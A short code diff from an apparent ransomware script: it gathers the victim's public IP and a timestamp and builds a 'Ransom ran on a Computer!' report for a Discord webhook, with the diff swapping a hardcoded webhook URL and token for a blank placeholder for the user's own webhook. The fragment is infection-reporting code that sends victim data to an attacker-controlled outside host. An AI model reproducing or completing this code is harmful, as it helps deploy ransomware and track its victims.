@@ -40,7 +40,7 @@ ip=get("https://api.ipify.org").text
 dt = datetime.datetime.now()
 nowt=dt.strftime("%Y-%m-%d %H:%M:%S")
 
-url = "https://discord.com/api/webhooks/975945287594024990/1Tdz8Hk8ymc5oqzQNUdqHSza5NWwDjWeKPMy8IqxRQ6pCeXdu9yojSJNBNfgl9e4_8R3"
+url = "" ### Your Webook goes inside the Quotes
 x = f"""**```
 Ransom ran on a Computer! 
 --------------------------
